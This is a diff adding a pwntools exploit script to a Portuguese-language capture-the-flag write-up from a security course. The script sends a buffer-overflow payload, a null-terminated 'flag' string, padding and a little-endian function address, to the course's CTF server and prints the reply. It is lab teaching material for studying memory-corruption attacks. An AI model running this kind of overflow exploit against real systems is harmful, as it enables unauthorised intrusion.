@@ -20,3 +20,25 @@
  passamos \x00 depois do flag para a função sprintf presente no readtxt apenas ler o payload até este momento e ignorar o resto
  colocamos 31 - len("flag") pois é o tamanho do buffer menos tamanho da string ("flag" + "\x00")
  Fazemos p32(readtxt_address) pois o sistema que estamos a trabalhar utiliza little endian para ler endereços de memória.
+
+```python
+#!/usr/bin/python3
+from pwn import *
+
+# to attack the remote server
+r = remote('ctf-fsi.fe.up.pt', 4000)
+# to run locally
+#r = process('./program')
+
+readtxt_address = p32(0x80497a5)
+
+flag = b"flag\x00"
+
+payload = flag + b"A" * (31 - len("flag")) + readtxt_address
+ 
+r.recvuntil(b"flag:\n")
+r.sendline(payload)
+
+buf = r.recv().decode()
+print(buf)
+```
